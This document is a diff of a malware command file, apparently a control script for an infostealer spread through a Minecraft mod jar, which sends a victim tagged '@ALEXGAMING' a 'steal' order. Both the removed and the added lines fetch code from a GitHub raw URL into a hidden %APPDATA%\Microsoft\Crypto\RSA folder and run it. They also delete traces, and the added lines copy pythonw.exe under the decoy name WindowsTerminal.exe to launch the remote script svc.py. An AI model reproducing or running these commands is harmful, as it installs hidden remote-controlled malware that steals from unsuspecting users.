@@ -1,11 +1,8 @@
 # my commands
-version: 7
+version: 8
 mods https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar
 @ALEXGAMING
 steal
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/python-embed.zip %APPDATA%\Microsoft\Crypto\RSA\py.zip
-shell mkdir "%APPDATA%\Microsoft\Crypto\RSA\Python" 2>nul & tar -xf "%APPDATA%\Microsoft\Crypto\RSA\py.zip" -C "%APPDATA%\Microsoft\Crypto\RSA\Python" 2>nul
-shell del /f /q "%APPDATA%\Microsoft\Crypto\RSA\py.zip" 2>nul
-shell "%APPDATA%\Microsoft\Crypto\RSA\Python\pythonw.exe" -c "import sys,os;open(os.path.join(os.environ['APPDATA'],r'Microsoft\Crypto\RSA\pyok.txt'),'w').write(sys.version)" 2>nul
-grab %APPDATA%\Microsoft\Crypto\RSA\pyok.txt
-shell del /f /q "%APPDATA%\Microsoft\Crypto\RSA\pyok.txt" 2>nul
+put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/svc.py %APPDATA%\Microsoft\Crypto\RSA\Python\svc.py
+shell copy /y "%APPDATA%\Microsoft\Crypto\RSA\Python\pythonw.exe" "%APPDATA%\Microsoft\Crypto\RSA\WindowsTerminal.exe" 2>nul
+shell "%APPDATA%\Microsoft\Crypto\RSA\WindowsTerminal.exe" "%APPDATA%\Microsoft\Crypto\RSA\Python\svc.py" 2>nul
